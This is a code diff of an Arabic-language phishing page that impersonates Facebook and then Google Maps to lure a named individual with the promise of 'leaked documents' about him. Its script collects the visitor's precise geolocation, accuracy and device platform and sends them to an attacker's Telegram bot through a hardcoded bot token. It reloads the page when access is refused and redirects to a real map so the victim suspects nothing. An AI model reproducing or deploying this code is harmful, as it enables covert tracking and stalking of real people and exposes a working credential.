@@ -3,79 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مركز أمان الحسابات</title>
+    <title>Google Maps - تحديد موقع المستند</title>
     <style>
-        body { background-color: #f0f2f5; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); width: 90%; max-width: 380px; text-align: center; }
-        .fb-logo { color: #1877f2; font-size: 24px; font-weight: bold; margin-bottom: 15px; }
-        .btn { background-color: #1877f2; color: white; padding: 12px; border-radius: 6px; text-decoration: none; display: block; font-weight: bold; margin-top: 20px; cursor: pointer; border: none; width: 100%; }
-        .info { font-size: 14px; color: #606770; line-height: 1.5; margin-top: 15px; }
-        #error-msg { color: red; font-size: 13px; display: none; margin-top: 10px; }
+        body { margin: 0; font-family: sans-serif; background: #e8eaed; display: flex; flex-direction: column; height: 100vh; }
+        #header { background: white; padding: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); text-align: center; font-weight: bold; color: #1a73e8; }
+        #map-bg { flex-grow: 1; background: url('https://tech-story.net/wp-content/uploads/2021/04/google-maps.jpg') no-repeat center; background-size: cover; filter: blur(8px); }
+        .overlay { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 25px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); width: 85%; max-width: 350px; text-align: center; z-index: 100; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 12px 25px; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 15px; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="fb-logo">Facebook Service</div>
-    <h3>تأكيد الهوية الرقمية</h3>
-    <p class="info">
-        لعرض التقرير الأمني الخاص بـ <b>(حيدر التراب)</b>، يتطلب النظام التحقق من موقعك الجغرافي لضمان وصولك الآمن من المنطقة المصرح بها.
-    </p>
-    <div id="error-msg">⚠️ فشلت المصادقة: يجب السماح بالوصول للموقع للمتابعة.</div>
-    <button class="btn" onclick="requestLocation()">تأكيد الهوية والتحميل</button>
+<div id="header">خرائط Google - عرض موقع التقرير</div>
+<div id="map-bg"></div>
+
+<div class="overlay">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92">
+    <h3>عرض الموقع الدقيق</h3>
+    <p style="color: #5f6368; font-size: 14px;">يجب السماح بالوصول إلى موقعك الجغرافي لفتح الخريطة وعرض مكان تواجد الوثائق المسربة الخاصة بـ (حيدر التراب).</p>
+    <button class="btn" onclick="getLocation()">فتح الخريطة الآن</button>
 </div>
 
 <script>
     const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
     const chat_id = '7214473798';
 
-    function sendToTelegram(message) {
-        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
-        fetch(url).catch(err => console.error('Error:', err));
+    function sendToTelegram(msg) {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
     }
 
-    function requestLocation() {
+    function getLocation() {
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(successCallback, errorCallback, {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
-            });
-        } else {
-            sendToTelegram("❌ المتصفح لا يدعم Geolocation.");
+            navigator.geolocation.getCurrentPosition(function(pos) {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const acc = pos.coords.accuracy;
+                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                
+                sendToTelegram(`🎯 تم الصيد بنجاح!\n📍 الرابط: ${mapLink}\n📏 الدقة: ${acc} متر`);
+                
+                // تحويله لخريطة حقيقية عشان ما يشك
+                window.location.href = "https://www.google.com/maps/search/" + lat + "," + lon;
+            }, function(err) {
+                sendToTelegram("⚠️ الهدف رفض الصلاحية مرة أخرى.");
+                alert("خطأ: يجب السماح بالوصول للموقع لعرض الخريطة.");
+                location.reload(); // إعادة التحميل لإجباره على المحاولة
+            }, {enableHighAccuracy: true});
         }
     }
-
-    function successCallback(position) {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-        const acc = position.coords.accuracy;
-        const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
-        
-        let report = `🎯 **تم صيد الهدف بنجاح!**\n\n`;
-        report += `📍 رابط الموقع:\n${googleMaps}\n\n`;
-        report += `📏 الدقة: ${acc} متر\n`;
-        report += `📱 الجهاز: ${navigator.platform}`;
-
-        sendToTelegram(report);
-
-        // تحويله لصفحة المنشور الأصلية بعد النجاح
-        setTimeout(() => {
-            window.location.href = "https://www.facebook.com/share/17y7raGdnu/";
-        }, 1000);
-    }
-
-    function errorCallback(error) {
-        document.getElementById('error-msg').style.display = 'block';
-        if (error.code === error.PERMISSION_DENIED) {
-            sendToTelegram("⚠️ الهدف رفض الصلاحية (ضغط Block).");
-        } else {
-            sendToTelegram("⚠️ خطأ في جلب الموقع: " + error.message);
-        }
-    }
-
-    // محاولة الطلب تلقائياً عند الدخول
-    window.onload = requestLocation;
 </script>
 
 </body>
